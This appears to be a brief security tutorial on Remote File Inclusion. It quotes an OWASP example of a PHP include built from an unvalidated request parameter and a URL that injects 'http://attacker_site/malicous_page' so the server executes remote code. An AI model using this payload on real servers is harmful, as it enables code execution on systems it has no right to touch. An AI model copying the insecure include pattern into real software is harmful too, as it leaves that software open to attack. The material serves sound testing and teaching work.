# Remote File Inclusion

Remote File Inclusion (also known as RFI) is the method of including remote files in an application by leveraging insecure inclusion procedures. This weakness happens when a page receives the link to the file that needs to be used as input and does not properly sanitize it, allowing an external URL to be injected.

## Manually

Since RFI occurs when paths passed to “include” statements are not properly sanitized, in a black-box testing approach, the tester should look for scripts which take filenames as parameters. Consider the following example taken from https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion.html

``` PHP
    $incfile = $_REQUEST["file"];
    include($incfile.".php");

```

This snippet of code is vulnerable to this type of attack since the path is derived from the HTTP request and no input validation is performed (for example, by testing the input against a whitelist). Consider the URL below:

```bash
    http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page
```

The remote file will be used in this scenario, and any code stored in it will be executed by the server.